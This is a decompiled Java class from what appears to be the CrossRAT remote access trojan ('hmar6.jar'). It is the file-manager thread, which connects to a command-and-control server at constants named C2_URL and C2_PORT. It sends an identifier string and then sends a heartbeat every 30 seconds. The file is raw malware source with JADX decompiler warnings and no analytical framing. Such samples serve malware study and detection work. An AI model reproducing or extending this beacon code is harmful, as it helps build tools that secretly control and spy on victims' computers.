package crossrat;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;

/* loaded from: hmar6.jar:crossrat/f.class */
final class f extends Thread {
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v1 */
    /* JADX WARN: Type inference failed for: r0v2 */
    /* JADX WARN: Type inference failed for: r0v3, types: [java.io.IOException] */
    /* JADX WARN: Type inference failed for: r0v5, types: [java.net.Socket] */
    /* JADX WARN: Type inference failed for: r0v9, types: [java.io.DataOutputStream] */
    @Override // java.lang.Thread, java.lang.Runnable
    public final void run() {
        new e();
        ?? r0 = 0;
        Socket socket = null;
        try {
            System.err.println("FILE MANAGER CONNECT");
            Socket socket2 = new Socket(k.C2_URL, k.C2_PORT);
            socket = socket2;
            k.l = socket2;
            new DataOutputStream(socket.getOutputStream()).writeBytes(String.valueOf(k.g) + k.arg_delimit + k.unimplemented_1 + k.arg_delimit + "&&&");
            while (true) {
                r0 = new DataOutputStream(k.l.getOutputStream());
                r0.writeBytes(String.valueOf(k.unimplemented_2) + k.arg_delimit + "&&&");
                try {
                    Thread.sleep(30000L);
                } catch (Exception unused) {
                }
            }
        } catch (Exception unused2) {
            try {
                r0 = socket;
                r0.close();
            } catch (IOException e) {
                r0.printStackTrace();
            }
            System.err.println("FILE MANAGER ERROR CONNECT");
        }
    }
}
